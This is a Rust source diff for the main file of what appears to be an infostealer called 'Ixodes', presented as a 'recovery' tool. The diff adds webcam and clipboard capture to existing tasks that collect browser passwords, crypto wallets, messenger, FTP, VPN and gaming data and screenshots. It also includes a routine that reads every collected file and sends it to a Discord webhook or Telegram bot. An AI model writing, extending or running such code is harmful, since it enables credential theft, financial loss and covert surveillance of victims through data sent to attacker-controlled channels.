@@ -10,8 +10,9 @@ use recovery::structured::{
 };
 use recovery::task::{RecoveryError, RecoveryOutcome};
 use recovery::{
-    RecoveryContext, RecoveryManager, account_validation, behavioral, file_recovery, ftp, gaming,
-    gecko, gecko_passwords, hardware, messenger, other, screenshot, services, system, vpn, wallet,
+    RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, file_recovery,
+    ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, screenshot, services, system,
+    vpn, wallet, webcam,
 };
 use tracing_subscriber::prelude::*;
 use tracing_subscriber::{EnvFilter, fmt};
@@ -63,6 +64,12 @@ async fn main() -> Result<(), RecoveryError> {
     if recovery::settings::RecoveryControl::global().capture_screenshots() {
         manager.register_task(screenshot::screenshot_task(&context));
     }
+    if recovery::settings::RecoveryControl::global().capture_webcams() {
+        manager.register_task(webcam::webcam_task(&context));
+    }
+    if recovery::settings::RecoveryControl::global().capture_clipboard() {
+        manager.register_task(clipboard::clipboard_task(&context));
+    }
     manager.register_tasks(behavioral::behavioral_tasks(&context));
     manager.register_tasks(hardware::hardware_tasks(&context));
     manager.register_task(file_recovery::file_recovery_task(&context));
@@ -93,18 +100,22 @@ async fn main() -> Result<(), RecoveryError> {
 }
 
 async fn send_outcomes(outcomes: &[RecoveryOutcome]) -> Result<(), Box<dyn std::error::Error>> {
-    use std::env;
-    use sender::{Sender, TelegramSender, DiscordSender, ChatId};
     use formatter::MessageFormatter;
+    use sender::{ChatId, DiscordSender, Sender, TelegramSender};
+    use std::env;
     use tokio::fs;
 
     let sender = if let Ok(webhook) = env::var("IXODES_DISCORD_WEBHOOK") {
         Sender::Discord(DiscordSender::new(webhook))
     } else if let Ok(token) = env::var("IXODES_TELEGRAM_TOKEN") {
-        let chat_id = env::var("IXODES_CHAT_ID").map(ChatId::from).unwrap_or_else(|_| ChatId::from(0));
+        let chat_id = env::var("IXODES_CHAT_ID")
+            .map(ChatId::from)
+            .unwrap_or_else(|_| ChatId::from(0));
         Sender::Telegram(TelegramSender::new(token), chat_id)
     } else {
-        tracing::warn!("no sender configuration found (IXODES_DISCORD_WEBHOOK or IXODES_TELEGRAM_TOKEN)");
+        tracing::warn!(
+            "no sender configuration found (IXODES_DISCORD_WEBHOOK or IXODES_TELEGRAM_TOKEN)"
+        );
         return Ok(());
     };
 
@@ -114,18 +125,30 @@ async fn send_outcomes(outcomes: &[RecoveryOutcome]) -> Result<(), Box<dyn std::
     summary.push_str("Recovery Session Complete\n\n");
     for outcome in outcomes {
         use std::fmt::Write;
-        let _ = writeln!(&mut summary, "Task: {} | Status: {:?} | Artifacts: {}", outcome.task, outcome.status, outcome.artifacts.len());
-        
+        let _ = writeln!(
+            &mut summary,
+            "Task: {} | Status: {:?} | Artifacts: {}",
+            outcome.task,
+            outcome.status,
+            outcome.artifacts.len()
+        );
+
         for artifact in &outcome.artifacts {
             if let Ok(content) = fs::read(&artifact.path).await {
-                 let filename = artifact.path.file_name().and_then(|n| n.to_str()).unwrap_or("unknown");
-                 sections.push((filename.to_string(), content));
+                let filename = artifact
+                    .path
+                    .file_name()
+                    .and_then(|n| n.to_str())
+                    .unwrap_or("unknown");
+                sections.push((filename.to_string(), content));
             }
         }
     }
 
     let formatter = MessageFormatter::new().with_max_length(sender.max_message_length());
-    sender.send_formatted_message(&formatter, vec![summary], Some(&sections)).await?;
+    sender
+        .send_formatted_message(&formatter, vec![summary], Some(&sections))
+        .await?;
 
     Ok(())
 }
